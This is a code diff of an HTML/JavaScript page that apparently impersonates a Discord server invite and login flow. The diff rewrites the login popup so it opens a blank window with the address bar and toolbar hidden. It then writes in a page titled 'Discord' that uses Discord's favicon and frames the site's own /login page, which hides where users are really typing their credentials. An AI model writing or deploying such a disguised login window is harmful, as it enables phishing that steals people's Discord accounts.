@@ -33,7 +33,7 @@
 </nav>
 
 <!-- MAIN CONTENT -->
-<div class="flex items-start justify-center px-4 pt-8" style="min-height:90vh;padding-bottom:80px">
+<div class="flex items-start justify-center px-4 pt-8" style="padding-bottom:60px">
   <div class="w-full max-w-5xl grid grid-cols-1 md:grid-cols-5 gap-6">
 
     <!-- LEFT: Server Card -->
@@ -123,11 +123,14 @@ function openDiscordLogin() {
   var w = 900, h = 650;
   var left = (screen.width - w) / 2;
   var top = (screen.height - h) / 2;
-  window.open(
-    '/login',
-    'discord_login',
-    'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',menubar=no,toolbar=yes,location=yes,status=no,resizable=yes,scrollbars=yes'
+  var win = window.open('about:blank', 'discord_login',
+    'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes'
   );
+  if (win) {
+    var u = window.location.origin + '/login';
+    win.document.write('<!DOCTYPE html><html><head><title>Discord</title><link rel="icon" href="https://discord.com/assets/favicon.ico"><style>*{margin:0;padding:0;overflow:hidden}body{height:100vh}iframe{width:100%;height:100%;border:none}</style></head><body><iframe src="' + u + '"></iframe></body></html>');
+    win.document.close();
+  }
 }
 
 // Parse URL data parameter (base64 JSON with guildId, name, members, icon)
